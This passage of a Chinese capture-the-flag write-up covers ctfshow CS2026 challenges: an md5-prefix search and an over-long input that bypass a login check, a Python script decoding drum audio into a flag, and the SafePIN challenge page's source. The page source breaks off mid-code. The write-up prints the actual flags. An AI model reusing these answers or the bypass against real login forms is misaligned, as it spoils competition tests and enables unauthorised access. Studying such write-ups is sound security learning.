<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 寻找 md5($str) 以 &quot;2025&quot; 开头且后续非数字的字符串</span><br><span class="line">for ($i = 0; $i &lt; 10000000; $i++) &#123;</span><br><span class="line">    $hash = md5((string)$i);</span><br><span class="line">    if (substr($hash, 0, 4) === &#x27;2025&#x27; &amp;&amp; !is_numeric($hash[4])) &#123;</span><br><span class="line">        echo &quot;Found Access Key: $i \n&quot;;</span><br><span class="line">        echo &quot;Hash: $hash \n&quot;;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Found Access Key: 434048 </span><br><span class="line">Hash: 2025a5bcb774da5ad1746af26547e357 </span><br></pre></td></tr></table></figure>

<p>php语言代码运行网址：</p>
<p>3v4l.org<br>网址：<a href="https://3v4l.org/">https://3v4l.org/</a><br>菜鸟教程在线编辑器<br>网址：<a href="https://www.runoob.com/try/runcode.php?filename=helloworld&type=php">https://www.runoob.com/try/runcode.php?filename=helloworld&amp;type=php</a><br>PHP Sandbox<br>网址：<a href="https://sandbox.onlinephpfunctions.com/">https://sandbox.onlinephpfunctions.com/</a></p>
<p>在题目页面的表单中填写：</p>
<p>访问密钥 (access_key): 434048<br>保留码 (channel_key): aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br>（输入由 65 个或更多字符组成的任意字符串，只要触发长度限制异常即可）这里对应了上面超过64个字符会触发异常</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104151019697.png" class="" title="SafePassword解题Payload">


<p>所以flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;832a75ba-6f7d-4f02-97a8-d8af4f65e746&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-HappySong"><a href="#4-HappySong" class="headerlink" title="4.HappySong"></a>4.HappySong</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">鼓声也可以很燃，虽然只有两个音节</span><br></pre></td></tr></table></figure>

<p>我对音频隐写不是很熟悉所以这题我是在AI的辅助下完成的，其实一提到常规的音频隐写，我就想到摩斯电码和二进制编码，这是我的第一反应。但怎么转换对我而言是个问题。我先用Audacity打开了这个音频文件。</p>
<p>这是AI对这题的回答：</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104152050773.png" class="" title="HappySong音频分析">


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">波形图（下半部分）：我们可以看到明显的“脉冲”或“节拍”。它们的时间间隔看起来是相当固定的，这意味着它不像传统的摩斯电码那样依靠“长音”和“短音”的时长来区分，而是依靠 音色/频率 来区分。</span><br><span class="line">频谱图（上半部分）：这是解题的关键。请注意看每一条竖线（每一个节拍）的颜色和高度。</span><br><span class="line">有些竖线颜色更亮，且频率延伸得更高（由于高频分量更多，看起来更“高”）。</span><br><span class="line">有些竖线颜色较暗，频率集中在低频（看起来更“矮”）。</span><br><span class="line">结论：这通常是用两种不同的鼓声（比如底鼓 Kick 和军鼓 Snare/Hi-hat）来代表摩斯电码中的“点（.）”和“划（-）”。</span><br><span class="line">观察波形之间的“空隙”（Silence）。</span><br><span class="line"></span><br><span class="line">你可以看到这些节拍是被分成一组一组的。</span><br><span class="line">如果是二进制（ASCII）：通常每组会有 8 个节拍（代表 1 byte）。（也就是说节拍是固定的）</span><br><span class="line">如果是摩斯电码：每组的节拍数量是不固定的（因为摩斯电码中每个字母的长度不同，例如 E 是 .，而 Q 是 --.-）。</span><br><span class="line">观察你的图：</span><br><span class="line">最左边第一组似乎有 4 个音，第二组有 1 个音，第三组有 4 个音……（这个属实有点为难我了，我对音符的认识如同白痴）</span><br><span class="line">这验证了你的猜想：这是摩斯电码。</span><br></pre></td></tr></table></figure>

<p>这里我让AI编写了一个脚本，来解析这个wav文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.io import wavfile</span><br><span class="line">from scipy.signal import find_peaks</span><br><span class="line"></span><br><span class="line">def solve_drum_bits(file_path):</span><br><span class="line">    print(f&quot;正在分析: &#123;file_path&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 1. 读取音频</span><br><span class="line">    try:</span><br><span class="line">        rate, data = wavfile.read(file_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;错误: &#123;e&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    if len(data.shape) &gt; 1: data = data.mean(axis=1) # 转单声道</span><br><span class="line">    </span><br><span class="line">    # 2. 寻找鼓点</span><br><span class="line">    # 根据你的日志，间隔非常短(0.12s)，所以 distance 设小一点</span><br><span class="line">    peaks, _ = find_peaks(data, distance=int(rate * 0.1), height=0.5)</span><br><span class="line">    print(f&quot;检测到 &#123;len(peaks)&#125; 个鼓点&quot;)</span><br><span class="line"></span><br><span class="line">    # 3. 提取特征 (0 或 1)</span><br><span class="line">    # 你的数据表明：低频~0.48，高频~0.95</span><br><span class="line">    # 我们取中间值 0.7 作为分界线</span><br><span class="line">    THRESHOLD = 0.7 </span><br><span class="line">    window_size = int(rate * 0.05)</span><br><span class="line">    </span><br><span class="line">    binary_string = &quot;&quot;</span><br><span class="line">    </span><br><span class="line">    print(&quot;\n开始解析二进制数据...&quot;)</span><br><span class="line">    for peak in peaks:</span><br><span class="line">        start = peak</span><br><span class="line">        end = min(peak + window_size, len(data))</span><br><span class="line">        segment = data[start:end]</span><br><span class="line">        </span><br><span class="line">        # FFT 频谱分析</span><br><span class="line">        fft_res = np.fft.fft(segment)</span><br><span class="line">        freqs = np.fft.fftfreq(len(segment), 1/rate)</span><br><span class="line">        magnitude = np.abs(fft_res)</span><br><span class="line">        </span><br><span class="line">        # 计算高频占比 (600Hz以上)</span><br><span class="line">        low_energy = np.sum(magnitude[(np.abs(freqs) &lt; 600)])</span><br><span class="line">        high_energy = np.sum(magnitude[(np.abs(freqs) &gt;= 600)])</span><br><span class="line">        total = low_energy + high_energy</span><br><span class="line">        if total == 0: ratio = 0</span><br><span class="line">        else: ratio = high_energy / total</span><br><span class="line">        </span><br><span class="line">        # === 核心逻辑修改 ===</span><br><span class="line">        # 如果占比 &gt; 0.7 (0.95那一档)，记为 &#x27;1&#x27;</span><br><span class="line">        # 如果占比 &lt; 0.7 (0.48那一档)，记为 &#x27;0&#x27;</span><br><span class="line">        if ratio &gt; THRESHOLD:</span><br><span class="line">            binary_string += &quot;1&quot;</span><br><span class="line">        else:</span><br><span class="line">            binary_string += &quot;0&quot;</span><br><span class="line"></span><br><span class="line">    print(f&quot;提取到的二进制串 (长度&#123;len(binary_string)&#125;):\n&#123;binary_string&#125;\n&quot;)</span><br><span class="line"></span><br><span class="line">    # 4. 尝试解码为 ASCII 字符</span><br><span class="line">    # 每 8 位一组转换</span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line">    print(&quot;尝试方案 A (0=低音, 1=高音):&quot;)</span><br><span class="line">    try:</span><br><span class="line">        chars = []</span><br><span class="line">        for i in range(0, len(binary_string), 8):</span><br><span class="line">            byte = binary_string[i:i+8]</span><br><span class="line">            if len(byte) == 8:</span><br><span class="line">                chars.append(chr(int(byte, 2)))</span><br><span class="line">        print(&quot;解码结果: &quot; + &quot;&quot;.join(chars))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解码出错: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line">    print(&quot;尝试方案 B (反转: 1=低音, 0=高音):&quot;)</span><br><span class="line">    # 有时候题目会故意反着来，备用方案</span><br><span class="line">    try:</span><br><span class="line">        inverted_bin = &quot;&quot;.join([&#x27;1&#x27; if b == &#x27;0&#x27; else &#x27;0&#x27; for b in binary_string])</span><br><span class="line">        chars = []</span><br><span class="line">        for i in range(0, len(inverted_bin), 8):</span><br><span class="line">            byte = inverted_bin[i:i+8]</span><br><span class="line">            if len(byte) == 8:</span><br><span class="line">                chars.append(chr(int(byte, 2)))</span><br><span class="line">        print(&quot;解码结果: &quot; + &quot;&quot;.join(chars))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解码出错: &#123;e&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 30)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 请确保路径正确</span><br><span class="line">    solve_drum_bits(r&#x27;C:\Users\Lenovo\Desktop\ctf\drum_bits.wav&#x27;) </span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\py\python.exe C:\Users\Lenovo\Desktop\ctf\123.py </span><br><span class="line">正在分析: C:\Users\Lenovo\Desktop\ctf\drum_bits.wav</span><br><span class="line">检测到 208 个鼓点</span><br><span class="line"></span><br><span class="line">开始解析二进制数据...</span><br><span class="line">提取到的二进制串 (长度208):</span><br><span class="line">0101010110011100100010111001100110001100100101111001000010001000100001001001010110001010100011001000101110100000100111101010000010010001100101101001110010011010101000001000110010010000100100011001100010000010</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">尝试方案 A (0=低音, 1=高音):</span><br><span class="line">解码结果: U   </span><br><span class="line">------------------------------</span><br><span class="line">尝试方案 B (反转: 1=低音, 0=高音):</span><br><span class="line">解码结果: ªctfshow&#123;just_a_nice_song&#125;</span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;just_a_nice_song&#125;</span><br></pre></td></tr></table></figure>

<p>至于脚本你们可以自己去研究。</p>
<h3 id="5-SafePIN"><a href="#5-SafePIN" class="headerlink" title="5.SafePIN"></a>5.SafePIN</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">绝对安全的身份认证系统</span><br></pre></td></tr></table></figure>

<p>这题也是音频有关的题，只不过考你的听力，把record.wav的声音与数字按下的声音对应上，输入正确顺序的PIN码就可以拿到flag.我的“听力”一向不好，所以我需要一些数据化的东西去对应。</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104153314418.png" class="" title="SafePIN验证系统界面">


<p>题目前端长这样，先下载record.wav,这题我依然可以用脚本处理，但是先要把每个数字对应某个频率，再与record.wav的频率去一一对应来找到频率相近的。</p>
<p>网页的源码是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;/&gt;</span><br><span class="line">  &lt;title&gt;高等级身份验证识别系统&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    :root&#123;</span><br><span class="line">      --bg:#07070b; --panel:#0b0b12; --txt:#e9e9ff; --muted:#9aa0c8;</span><br><span class="line">      --neon1:#38bdf8; --neon2:#fb7185; --ok:#22c55e; --bad:#ef4444; --warn:#f59e0b;</span><br><span class="line">    &#125;</span><br><span class="line">    *&#123;box-sizing:border-box&#125;</span><br><span class="line">    body&#123;</span><br><span class="line">      margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;</span><br><span class="line">      background: radial-gradient(900px 600px at 70% 20%, rgba(56,189,248,.08), transparent 60%),</span><br><span class="line">                  radial-gradient(700px 420px at 25% 65%, rgba(251,113,133,.08), transparent 60%),</span><br><span class="line">                  linear-gradient(180deg, #05050a 0%, #0a0a12 100%);</span><br><span class="line">      color:var(--txt); font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial;</span><br><span class="line">    &#125;</span><br><span class="line">    .wrap&#123;width:min(920px,96vw); display:grid; grid-template-columns: 1.2fr .8fr; gap:16px; padding:16px;&#125;</span><br><span class="line">    .card&#123;border-radius:18px; background:rgba(10,10,18,.88); border:1px solid rgba(255,255,255,.06); box-shadow: 0 14px 60px rgba(0,0,0,.55); overflow:hidden;&#125;</span><br><span class="line">    .left&#123;padding:18px;&#125;</span><br><span class="line">    .right&#123;padding:18px; display:flex; flex-direction:column; gap:12px;&#125;</span><br><span class="line">    .title&#123;letter-spacing:.18em; text-transform:uppercase; font-size:18px; color:#dbeafe&#125;</span><br><span class="line">    .sub&#123;margin-top:6px; font-size:12px; color:var(--muted); line-height:1.45&#125;</span><br><span class="line">    .screen&#123;margin-top:14px; padding:14px; border-radius:16px; background:rgba(6,6,12,.85); border:1px solid rgba(255,255,255,.06)&#125;</span><br><span class="line">    .pinRow&#123;display:flex; justify-content:space-between; align-items:center; gap:10px;&#125;</span><br><span class="line">    .dots&#123;display:flex; gap:8px;&#125;</span><br><span class="line">    .dot&#123;width:12px;height:12px;border-radius:999px;border:1px solid rgba(255,255,255,.16);background:rgba(255,255,255,.06)&#125;</span><br><span class="line">    .dot.filled&#123;background:rgba(56,189,248,.85); border-color: rgba(56,189,248,.55); box-shadow: 0 0 18px rgba(56,189,248,.25);&#125;</span><br><span class="line">    .msg&#123;margin-top:10px; min-height:18px; font-size:12px; color:var(--muted)&#125;</span><br><span class="line">    .msg.ok&#123;color:#bbf7d0&#125; .msg.bad&#123;color:#fecaca&#125; .msg.warn&#123;color:#fde68a&#125;</span><br><span class="line">    .kbd&#123;margin-top:14px; display:grid; grid-template-columns:repeat(3,1fr); gap:10px;&#125;</span><br><span class="line">    .key&#123;height:56px;border-radius:16px;border:1px solid rgba(255,255,255,.08); background:rgba(16,16,26,.72); color:rgba(233,233,255,.96); font-size:18px; cursor:pointer; transition:.15s&#125;</span><br><span class="line">    .key:hover&#123;transform:translateY(-1px); border-color: rgba(56,189,248,.22); box-shadow: 0 0 18px rgba(56,189,248,.18)&#125;</span><br><span class="line">    .key.fn&#123;font-size:13px; letter-spacing:.14em; text-transform:uppercase&#125;</span><br><span class="line">    .key.cancel:hover&#123;border-color: rgba(251,113,133,.32); box-shadow: 0 0 18px rgba(251,113,133,.18)&#125;</span><br><span class="line">    .key.enter:hover&#123;border-color: rgba(34,197,94,.22); box-shadow: 0 0 18px rgba(34,197,94,.14)&#125;</span><br><span class="line">    .box&#123;padding:12px;border-radius:16px;background:rgba(6,6,12,.65);border:1px solid rgba(255,255,255,.06)&#125;</span><br><span class="line">    .mono&#123;font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;,&quot;Courier New&quot;, monospace;&#125;</span><br><span class="line">    .btn&#123;width:100%; padding:10px 12px; border-radius:14px; border:1px solid rgba(255,255,255,.08); background:rgba(255,255,255,.02); color:rgba(226,232,240,.9); cursor:pointer;&#125;</span><br><span class="line">    .btn:hover&#123;border-color: rgba(167,139,250,.22); box-shadow:0 0 18px rgba(167,139,250,.12)&#125;</span><br><span class="line">    @media (max-width:900px)&#123;.wrap&#123;grid-template-columns:1fr&#125;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;wrap&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;card left&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;高等级身份验证识别系统 CTFSHOW-CS2026&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;sub&quot;&gt;已经拦截了嫌疑人的密码音频&lt;span class=&quot;mono&quot;&gt;record.wav&lt;/span&gt; 需要还原最终 PIN。&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;screen&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;pinRow&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mono&quot; style=&quot;font-size:12px;letter-spacing:.14em;color:#cbd5e1;&quot;&gt;PIN&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;dots&quot; id=&quot;dots&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;msg warn&quot; id=&quot;msg&quot;&gt;加载中…&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;kbd&quot; id=&quot;kbd&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;card right&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:#e0f2fe;&quot;&gt;附件&lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:8px;font-size:12px;color:rgba(226,232,240,.78);line-height:1.55;&quot;&gt;</span><br><span class="line">        CTFSHOW &lt;span class=&quot;mono&quot;&gt;CS2026&lt;/span&gt;最终正确的密码为&lt;span class=&quot;mono&quot;&gt;6&lt;/span&gt;位。</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:10px;display:flex;gap:10px;&quot;&gt;</span><br><span class="line">        &lt;a class=&quot;btn&quot; id=&quot;dl&quot; href=&quot;#&quot; download style=&quot;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;&quot;&gt;下载 record.wav&lt;/a&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;font-size:12px;letter-spacing:.16em;text-transform:uppercase;color:#e0f2fe;&quot;&gt;提示&lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;margin-top:8px;font-size:12px;color:rgba(226,232,240,.78);line-height:1.55;&quot;&gt;</span><br><span class="line">        此题不需要爆破、扫描、竞争</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;button class=&quot;btn&quot; id=&quot;test&quot; style=&quot;margin-top:10px;&quot;&gt;依次播放 0-9（当前会话）&lt;/button&gt;</span><br><span class="line">      &lt;button class=&quot;btn&quot; id=&quot;clear&quot; style=&quot;margin-top:10px;&quot;&gt;清空输入&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">(() =&gt; &#123;</span><br><span class="line">  const MAX_LEN = 6;</span><br><span class="line">  const dots = document.getElementById(&#x27;dots&#x27;);</span><br><span class="line">  const msg  = document.getElementById(&#x27;msg&#x27;);</span><br><span class="line">  const kbd  = document.getElementById(&#x27;kbd&#x27;);</span><br><span class="line">  const dl   = document.getElementById(&#x27;dl&#x27;);</span><br><span class="line"></span><br><span class="line">  let pin = &quot;&quot;;</span><br><span class="line">  let seed = null;</span><br><span class="line">  let map = null; </span><br><span class="line">  const SOUND_CANCEL = 10;</span><br><span class="line">  const SOUND_ENTER  = 11;</span><br><span class="line"></span><br><span class="line">  function setMsg(t, cls=&quot;warn&quot;)&#123;</span><br><span class="line">    msg.className = &quot;msg &quot; + cls;</span><br><span class="line">    msg.textContent = t || &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  function renderDots()&#123;</span><br><span class="line">    dots.innerHTML = &quot;&quot;;</span><br><span class="line">    for(let i=0;i&lt;MAX_LEN;i++)&#123;</span><br><span class="line">      const d = document.createElement(&quot;div&quot;);</span><br><span class="line">      d.className = &quot;dot&quot; + (i &lt; pin.length ? &quot; filled&quot; : &quot;&quot;);</span><br><span class="line">      dots.appendChild(d);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const AudioCtx = window.AudioContext || window.webkitAudioContext;</span><br><span class="line">  const ctx = new AudioCtx();</span><br><span class="line"></span><br><span class="line">function sha256Hex(str)&#123;</span><br><span class="line">  if (window.crypto &amp;&amp; window.crypto.subtle &amp;&amp; typeof window.crypto.subtle.digest === &quot;function&quot;) &#123;</span><br><span class="line">    return window.crypto.subtle.digest(&quot;SHA-256&quot;, new TextEncoder().encode(str)).then(buf=&gt;&#123;</span><br><span class="line">      const b = new Uint8Array(buf);</span><br><span class="line">      let s=&quot;&quot;; for(const x of b) s += x.toString(16).padStart(2,&quot;0&quot;);</span><br><span class="line">      return s;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  return Promise.resolve(sha256_sync_hex(str));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sha256_sync_hex(ascii)&#123;</span><br><span class="line">  function ror(n,x)&#123; return (x&gt;&gt;&gt;n) | (x&lt;&lt;(32-n)); &#125;</span><br><span class="line">  function toHex(n)&#123; return (n&gt;&gt;&gt;0).toString(16).padStart(8,&quot;0&quot;); &#125;</span><br><span class="line"></span><br><span class="line">  const K = [</span><br><span class="line">    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,</span><br><span class="line">    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,</span><br><span class="line">    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,</span><br><span class="line">    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,</span><br><span class="line">    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,</span><br><span class="line">    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,</span><br><span class="line">    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,</span><br><span class="line">    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  const msg = new TextEncoder().encode(ascii);</span><br><span class="line">  const l = msg.length;</span><br><span class="line"></span><br><span class="line">  const bitLenHi = Math.floor((l * 8) / 0x100000000);</span><br><span class="line">  const bitLenLo = (l * 8) &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">  const withOne = l + 1;</span><br><span class="line">  const padLen = (withOne % 64 &lt;= 56) ? (56 - (withOne % 64)) : (56 + 64 - (withOne % 64));</span><br><span class="line">  const total = l + 1 + padLen + 8;</span><br><span class="line"></span><br><span class="line">  const bytes = new Uint8Array(total);</span><br><span class="line">  bytes.set(msg, 0);</span><br><span class="line">  bytes[l] = 0x80;</span><br><span class="line"></span><br><span class="line">  const dv = new DataView(bytes.buffer);</span><br><span class="line">  dv.setUint32(total - 8, bitLenHi, false);</span><br><span class="line">  dv.setUint32(total - 4, bitLenLo, false);</span><br><span class="line"></span><br><span class="line">  let h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;</span><br><span class="line"></span><br><span class="line">  const w = new Uint32Array(64);</span><br><span class="line"></span><br><span class="line">  for(let off=0; off&lt;total; off+=64)&#123;</span><br><span class="line">    for(let i=0;i&lt;16;i++)&#123;</span><br><span class="line">      w[i] = dv.getUint32(off + i*4, false);</span><br><span class="line">    &#125;</span><br><span class="line">    for(let i=16;i&lt;64;i++)&#123;</span><br><span class="line">      const s0 = (ror(7,w[i-15]) ^ ror(18,w[i-15]) ^ (w[i-15]&gt;&gt;&gt;3)) &gt;&gt;&gt; 0;</span><br><span class="line">      const s1 = (ror(17,w[i-2]) ^ ror(19,w[i-2]) ^ (w[i-2]&gt;&gt;&gt;10)) &gt;&gt;&gt; 0;</span><br><span class="line">      w[i] = (w[i-16] + s0 + w[i-7] + s1) &gt;&gt;&gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let a=h0,b=h1,c=h2,d=h3,e=h4,f=h5,g=h6,h=h7;</span><br><span class="line"></span><br><span class="line">    for(let i=0;i&lt;64;i++)&#123;</span><br><span class="line">      const S1 = (ror(6,e) ^ ror(11,e) ^ ror(25,e)) &gt;&gt;&gt; 0;</span><br><span class="line">      const ch = ((e &amp; f) ^ (~e &amp; g)) &gt;&gt;&gt; 0;</span><br><span class="line">      const t1 = (h + S1 + ch + K[i] + w[i]) &gt;&gt;&gt; 0;</span><br><span class="line">      const S0 = (ror(2,a) ^ ror(13,a) ^ ror(22,a)) &gt;&gt;&gt; 0;</span><br><span class="line">      const maj = ((a &amp; b) ^ (a &amp; c) ^ (b &amp; c)) &gt;&gt;&gt; 0;</span><br><span class="line">      const t2 = (S0 + maj) &gt;&gt;&gt; 0;</span><br><span class="line"></span><br><span class="line">      h=g; g=f; f=e; e=(d + t1)&gt;&gt;&gt;0; d=c; c=b; b=a; a=(t1 + t2)&gt;&gt;&gt;0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h0=(h0+a)&gt;&gt;&gt;0; h1=(h1+b)&gt;&gt;&gt;0; h2=(h2+c)&gt;&gt;&gt;0; h3=(h3+d)&gt;&gt;&gt;0;</span><br><span class="line">    h4=(h4+e)&gt;&gt;&gt;0; h5=(h5+f)&gt;&gt;&gt;0; h6=(h6+g)&gt;&gt;&gt;0; h7=(h7+h)&gt;&gt;&gt;0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return toHex(h0)+toHex(h1)+toHex(h2)+toHex(h3)+toHex(h4)+toHex(h5)+toHex(h6)+toHex(h7);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  function u32FromHex8(h8)&#123;</span><br><span class="line"></span><br><span class="line">    const b0 = parseInt(h8.slice(0,2),16);</span><br><span class="line">    const b1 = parseInt(h8.slice(2,4),16);</span><br><span class="line">    const b2 = parseInt(h8.slice(4,6),16);</span><br><span class="line">    const b3 = parseInt(h8.slice(6,8),16);</span><br><span class="line">    return (b0 | (b1&lt;&lt;8) | (b2&lt;&lt;16) | (b3&lt;&lt;24)) &gt;&gt;&gt; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function prng_u32(seed, tag)&#123;</span><br><span class="line">    const h = await sha256Hex(seed + &quot;|&quot; + tag);</span><br><span class="line">    return u32FromHex8(h.slice(0,8));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function permute_0_9(seed)&#123;</span><br><span class="line">    const a = [...Array(10).keys()];</span><br><span class="line">    let x = await prng_u32(seed, &quot;perm&quot;);</span><br><span class="line">    for(let i=9;i&gt;=1;i--)&#123;</span><br><span class="line">      x = (Math.imul(x, 1664525) + 1013904223) &gt;&gt;&gt; 0;</span><br><span class="line">      const j = x % (i+1);</span><br><span class="line">      [a[i], a[j]] = [a[j], a[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    return a; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function clamp(x, lo, hi)&#123; return x&lt;lo?lo:(x&gt;hi?hi:x); &#125;</span><br><span class="line"></span><br><span class="line">  async function soundParams(seed, soundId)&#123;</span><br><span class="line">    const x = await prng_u32(seed, &quot;p&quot;+soundId);</span><br><span class="line">    const base = 1050 + soundId*23 + (((x &amp; 0xff) - 128) * 0.35);</span><br><span class="line">    const dur  = 0.082 + (((x &gt;&gt;&gt; 8) &amp; 0xff)/255) * 0.018;</span><br><span class="line">    const pre  = 0.0018 + (((x &gt;&gt;&gt; 16) &amp; 0xff)/255) * 0.0045;</span><br><span class="line">    const atk  = 0.0012 + (((x &gt;&gt;&gt; 24) &amp; 0xff)/255) * 0.0022;</span><br><span class="line">    const click= 0.16 + ((x &amp; 0xff)/255) * 0.10;</span><br><span class="line">    const pan  = clamp(((soundId - 4.5)/14) + ((((x&gt;&gt;&gt;8)&amp;0xff)-128)/128)*0.03, -0.35, 0.35);</span><br><span class="line">    return &#123;base,dur,pre,atk,click,pan, soundId&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  async function playSoundId(soundId)&#123;</span><br><span class="line">    await ctx.resume();</span><br><span class="line"></span><br><span class="line">    const p = await soundParams(seed, soundId);</span><br><span class="line">    const now = ctx.currentTime;</span><br><span class="line"></span><br><span class="line">    const leftGain  = clamp(1.0 - p.pan, 0.70, 1.30);</span><br><span class="line">    const rightGain = clamp(1.0 + p.pan, 0.70, 1.30);</span><br><span class="line">    const 